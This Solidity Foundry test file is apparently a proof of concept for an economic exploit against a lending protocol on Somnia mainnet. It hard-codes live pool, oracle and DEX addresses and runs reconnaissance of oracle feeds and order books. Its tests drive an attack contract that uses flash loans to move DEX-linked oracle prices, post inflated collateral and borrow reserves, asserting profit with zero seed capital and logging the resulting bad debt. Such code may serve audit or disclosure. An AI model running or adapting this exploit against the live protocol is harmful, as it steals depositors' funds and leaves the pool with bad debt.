// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IAaveOracle, IDreamDexSpotPool, IERC20, ISomniaLendPool, ReserveData} from "../src/Interfaces.sol";
import {SomniaLendAttack} from "../src/SomniaLendAttack.sol";

contract SomniaLendEconomicPoCTest is Test {
    address internal constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address internal constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address internal constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address internal constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
    address internal constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
    address internal constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address internal constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
    address internal constant SOMI_USDSO = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;
    address internal constant USDC_USDSO = 0x47fD2f18426f67106DBaC82F6d21D446c5F2120b;
    address internal constant WETH_USDSO = 0xa936da11B57b50A344e1293AAaE5232885ea2bDE;
    address internal constant WBTC_USDSO = 0x25bfF6B7B5E2243424F38E75de7ab03C0522a5EA;
    address internal constant DEX_PROXY_READER = 0x790554C0D6914Edb90F8d05B2f0bBc8560502660;
    bytes32 internal constant EIP1967_IMPLEMENTATION =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    uint256 internal forkBlock;
    uint256 internal somiFlash;
    uint256 internal usdcFlash;
    uint256 internal buyLimitBps;
    uint256 internal sellLimitBps;
    uint256 internal unwindLimitBps;
    uint256 internal borrowBps;
    bool internal borrowAll;
    bool internal unwind;

    function setUp() public {
        string memory rpc = vm.envString("SOMNIA_RPC_URL");
        forkBlock = vm.envUint("SOMNIA_FORK_BLOCK");
        require(forkBlock > 0, "pin SOMNIA_FORK_BLOCK");
        vm.createSelectFork(rpc, forkBlock);
        require(block.chainid == 5031, "not Somnia mainnet");
        require(block.number == forkBlock, "fork block mismatch");

        somiFlash = vm.envOr("SOMI_FLASH_USDSO", uint256(25_000 ether));
        usdcFlash = vm.envOr("USDSO_ATTACK_FLASH_USDC", uint256(1_000e6));
        buyLimitBps = vm.envOr("DEX_BUY_LIMIT_BPS", uint256(11_000));
        sellLimitBps = vm.envOr("DEX_SELL_LIMIT_BPS", uint256(9_000));
        unwindLimitBps = vm.envOr("DEX_UNWIND_LIMIT_BPS", uint256(9_000));
        borrowBps = vm.envOr("BORROW_BPS", uint256(10_000));
        borrowAll = vm.envOr("BORROW_ALL_OPPOSITE_RESERVES", false);
        unwind = vm.envOr("UNWIND_LIQUID_SURPLUS", true);
    }

    function test_recon_exact_live_configuration() public view {
        bytes32 implementationSlot = vm.load(POOL, EIP1967_IMPLEMENTATION);
        console2.log("fork block", block.number);
        console2.log("Pool EIP-1967 implementation", address(uint160(uint256(implementationSlot))));
        console2.log("oracle base currency", IAaveOracle(ORACLE).BASE_CURRENCY());
        console2.log("oracle base unit", IAaveOracle(ORACLE).BASE_CURRENCY_UNIT());
        console2.log("fallback oracle", IAaveOracle(ORACLE).getFallbackOracle());
        console2.log("flash premium total bps", ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL());

        address[] memory reserves = ISomniaLendPool(POOL).getReservesList();
        console2.log("reserve count", reserves.length);
        for (uint256 i; i < reserves.length; ++i) {
            address asset = reserves[i];
            ReserveData memory reserve = ISomniaLendPool(POOL).getReserveData(asset);
            address source = IAaveOracle(ORACLE).getSourceOfAsset(asset);
            console2.log("--- reserve", asset);
            console2.log("symbol", IERC20(asset).symbol());
            console2.log("decimals", IERC20(asset).decimals());
            console2.log("aToken", reserve.aTokenAddress);
            console2.log("variableDebtToken", reserve.variableDebtTokenAddress);
            console2.log("aToken cash", IERC20(asset).balanceOf(reserve.aTokenAddress));
            console2.log("variable debt supply", IERC20(reserve.variableDebtTokenAddress).totalSupply());
            console2.log("reserve configuration raw", reserve.configuration.data);
            console2.log("oracle answer", IAaveOracle(ORACLE).getAssetPrice(asset));
            console2.log("configured source", source);
            console2.log("source code size", source.code.length);
            if (source != address(0)) {
                bytes32 feedImplementation = vm.load(source, EIP1967_IMPLEMENTATION);
                console2.log(
                    "feed EIP-1967 implementation (zero if not proxy)", address(uint160(uint256(feedImplementation)))
                );
            }
            _logFeed(source);
        }

        _logDex("SOMI/USDso", SOMI_USDSO);
        _logDex("USDC.e/USDso", USDC_USDSO);
        _logDex("WETH/USDso", WETH_USDSO);
        _logDex("WBTC/USDso", WBTC_USDSO);

        (bool ok, bytes memory data) = DEX_PROXY_READER.staticcall(abi.encodeWithSignature("implementation()"));
        require(ok && data.length >= 32, "DEX implementation read failed");
        console2.log("SOMI SpotPool implementation", abi.decode(data, (address)));
    }

    function test_control_no_trade_no_oracle_delta() public {
        uint256 premium = (somiFlash * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
        SomniaLendAttack attacker = new SomniaLendAttack();
        // Controls must repay without an attack. This seed is explicitly logged and is not profit.
        deal(USDSO, address(attacker), premium);
        uint256 somiBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        uint256 usdsoBefore = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        uint256 usdcBefore = IAaveOracle(ORACLE).getAssetPrice(USDC);

        attacker.runControl(USDSO, somiFlash);

        assertEq(IAaveOracle(ORACLE).getAssetPrice(WSOMI), somiBefore, "control moved SOMI");
        assertEq(IAaveOracle(ORACLE).getAssetPrice(USDSO), usdsoBefore, "control moved USDso");
        assertEq(IAaveOracle(ORACLE).getAssetPrice(USDC), usdcBefore, "control moved USDC");
        assertEq(attacker.borrowedFlashAsset(), 0, "control borrowed");
        assertEq(attacker.baseTraded(), 0, "control traded");
        assertEq(attacker.netUsdsoDelta(), -int256(premium), "control cost mismatch");
        _writeResult(attacker, "results/control.json", false);
    }

    /// @dev Exploit assertion: no seed capital is supplied. An unprofitable/repayment-short
    ///      attack is expected to make this test revert; use the instrumented test for full metrics.
    function test_somi_atomic_zero_seed() public {
        SomniaLendAttack attacker = new SomniaLendAttack();
        attacker.runSomi(somiFlash, buyLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        assertGt(attacker.baseTraded(), 0, "no SOMI execution");
        assertGt(attacker.suppliedCollateral(), 0, "no WSOMI supplied");
        assertGt(attacker.borrowedFlashAsset(), 0, "no USDso borrowed");
        assertEq(attacker.finalUsdc(), 0, "unaccounted USDC seed/proceeds");
        assertGt(attacker.netUsdsoDelta(), 0, "no positive atomic liquid P&L");
        _writeResult(attacker, "results/somi-zero-seed.json", true);
    }

    /// @dev Measurement path: coverage permits a losing attack to finish repayment. Every seeded
    ///      token is subtracted in the net vectors; this is not an exploit-profit assertion.
    function test_somi_instrumented_with_loss_coverage() public {
        SomniaLendAttack attacker = new SomniaLendAttack();
        uint256 premium = (somiFlash * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
        deal(USDSO, address(attacker), somiFlash + premium);
        attacker.runSomi(somiFlash, buyLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        assertGt(attacker.baseTraded(), 0, "no SOMI execution");
        assertGt(attacker.suppliedCollateral(), 0, "no WSOMI supplied");
        assertGt(attacker.borrowedFlashAsset(), 0, "no USDso borrowed");
        _writeResult(attacker, "results/somi-instrumented.json", false);
    }

    function test_usdso_atomic_zero_seed() public {
        SomniaLendAttack attacker = new SomniaLendAttack();
        attacker.runUsdso(usdcFlash, sellLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        assertGt(attacker.baseTraded(), 0, "no USDC execution");
        assertGt(attacker.suppliedCollateral(), 0, "no USDso supplied");
        assertGt(attacker.borrowedFlashAsset(), 0, "no USDC borrowed");
        assertGt(attacker.netUsdsoDelta(), 0, "no positive atomic liquid P&L");
        assertEq(attacker.netUsdcDelta(), 0, "unwound zero-seed P&L still has USDC exposure");
        _writeResult(attacker, "results/usdso-zero-seed.json", true);
    }

    function test_usdso_instrumented_with_loss_coverage() public {
        SomniaLendAttack attacker = new SomniaLendAttack();
        uint256 premium = (usdcFlash * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
        deal(USDC, address(attacker), usdcFlash + premium);
        attacker.runUsdso(usdcFlash, sellLimitBps, unwindLimitBps, borrowBps, borrowAll, unwind);
        assertGt(attacker.baseTraded(), 0, "no USDC execution");
        assertGt(attacker.suppliedCollateral(), 0, "no USDso supplied");
        assertGt(attacker.borrowedFlashAsset(), 0, "no USDC borrowed");
        // A losing run can have negative USDC delta. It is deliberately NOT converted at the
        // manipulated oracle; inspect both signed liquid deltas and the real unwind execution log.
        _writeResult(attacker, "results/usdso-instrumented.json", false);
    }

    function _logFeed(address source) internal view {
        if (source == address(0)) return;
        (bool decimalsOk, bytes memory decimalsData) = source.staticcall(abi.encodeWithSignature("decimals()"));
        if (decimalsOk && decimalsData.length >= 32) {
            console2.log("feed decimals", abi.decode(decimalsData, (uint8)));
        }
        (bool ok, bytes memory data) = source.staticcall(abi.encodeWithSignature("latestRoundData()"));
        if (ok && data.length >= 160) {
            (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
                abi.decode(data, (uint80, int256, uint256, uint256, uint80));
            console2.log("feed round", roundId);
            console2.log("feed answer", answer);
            console2.log("feed startedAt", startedAt);
            console2.log("feed updatedAt", updatedAt);
            console2.log("feed answeredInRound", answeredInRound);
            console2.log("chain timestamp", block.timestamp);
        } else {
            (bool answerOk, bytes memory answerData) = source.staticcall(abi.encodeWithSignature("latestAnswer()"));
            (bool timeOk, bytes memory timeData) = source.staticcall(abi.encodeWithSignature("latestTimestamp()"));
            console2.log("latestRoundData unsupported; latestAnswer status", answerOk);
            if (answerOk && answerData.length >= 32) console2.log("feed answer", abi.decode(answerData, (int256)));
            if (timeOk && timeData.length >= 32) console2.log("feed timestamp", abi.decode(timeData, (uint256)));
        }
    }

    function _logDex(string memory label, address dexPool) internal view {
        (
            address base,
            address quote,
            uint256 makerFee,
            uint256 takerFee,
            uint256 tick,
            uint256 minQuantity,
            uint256 lot
        ) = IDreamDexSpotPool(dexPool).getPoolParams();
        console2.log("--- DEX market", label);
        console2.log("pool", dexPool);
        console2.log("base", base);
        console2.log("quote", quote);
        console2.log("maker fee bps*1000", makerFee);
        console2.log("taker fee bps*1000", takerFee);
        console2.log("tick", tick);
        console2.log("minimum quantity", minQuantity);
        console2.log("lot", lot);
        _logBook(dexPool, true);
        _logBook(dexPool, false);
    }

    function _logBook(address dexPool, bool isBid) internal view {
        IDreamDexSpotPool.BookLevel[] memory levels = IDreamDexSpotPool(dexPool).getBookLevels(isBid, 5);
        console2.log("book isBid", isBid);
        console2.log("returned levels", levels.length);
        for (uint256 i; i < levels.length; ++i) {
            console2.log("level price", levels[i].price);
            console2.log("level quantity", levels[i].quantity);
        }
    }

    function _writeResult(SomniaLendAttack attacker, string memory path, bool zeroSeed) internal {
        string memory json = vm.serializeUint("result", "forkBlock", forkBlock);
        json = vm.serializeBool("result", "zeroSeed", zeroSeed);
        json = vm.serializeUint("result", "flashPremium", attacker.flashPremium());
        json = vm.serializeUint("result", "flashRepayment", attacker.flashRepayment());
        json = vm.serializeUint("result", "collateralOracleBefore", attacker.collateralOracleBefore());
        json = vm.serializeUint("result", "collateralOracleAfterTrade", attacker.collateralOracleAfterTrade());
        json = vm.serializeUint("result", "debtOracleBefore", attacker.debtOracleBefore());
        json = vm.serializeUint("result", "debtOracleAfterTrade", attacker.debtOracleAfterTrade());
        json = vm.serializeUint("result", "dexBestBefore", attacker.dexBestBefore());
        json = vm.serializeUint("result", "dexBestAfter", attacker.dexBestAfter());
        json = vm.serializeUint("result", "executionPriceRaw", attacker.executionPriceRaw());
        json = vm.serializeUint("result", "baseTraded", attacker.baseTraded());
        json = vm.serializeUint("result", "quoteTraded", attacker.quoteTraded());
        json = vm.serializeUint("result", "suppliedCollateral", attacker.suppliedCollateral());
        json = vm.serializeUint("result", "baselineBorrowPowerBase", attacker.baselineBorrowPowerBase());
        json = vm.serializeUint("result", "postSupplyAvailableBorrowsBase", attacker.postSupplyAvailableBorrowsBase());
        json = vm.serializeUint("result", "borrowPowerIncreaseBase", attacker.borrowPowerIncreaseBase());
        json = vm.serializeUint("result", "borrowedFlashAsset", attacker.borrowedFlashAsset());
        json = vm.serializeUint("result", "borrowedUSDC", attacker.borrowed(USDC));
        json = vm.serializeUint("result", "borrowedUSDso", attacker.borrowed(USDSO));
        json = vm.serializeUint("result", "borrowedWETH", attacker.borrowed(WETH));
        json = vm.serializeUint("result", "borrowedWBTC", attacker.borrowed(WBTC));
        json = vm.serializeUint("result", "borrowedWSOMI", attacker.borrowed(WSOMI));
        json = vm.serializeUint("result", "totalCollateralBase", attacker.totalCollateralBase());
        json = vm.serializeUint("result", "totalDebtBase", attacker.totalDebtBase());
        json = vm.serializeUint("result", "badDebtNowBase", attacker.badDebtNowBase());
        json = vm.serializeUint("result", "debtIfCollateralZeroBase", attacker.debtIfCollateralZeroBase());
        json = vm.serializeUint("result", "healthFactor", attacker.healthFactor());
        json = vm.serializeInt("result", "netLiquidUSDsoDelta", attacker.netUsdsoDelta());
        json = vm.serializeInt("result", "netLiquidUSDCDelta", attacker.netUsdcDelta());
        json = vm.serializeInt("result", "netLiquidWETHDelta", attacker.netWethDelta());
        json = vm.serializeInt("result", "netLiquidWBTCDelta", attacker.netWbtcDelta());
        json = vm.serializeUint("result", "finalNativeSOMI", attacker.finalNative());
        json = vm.serializeUint("result", "approxExecutionGasNotReceiptGas", attacker.gasUsedApprox());
        vm.writeJson(json, path);
    }
}
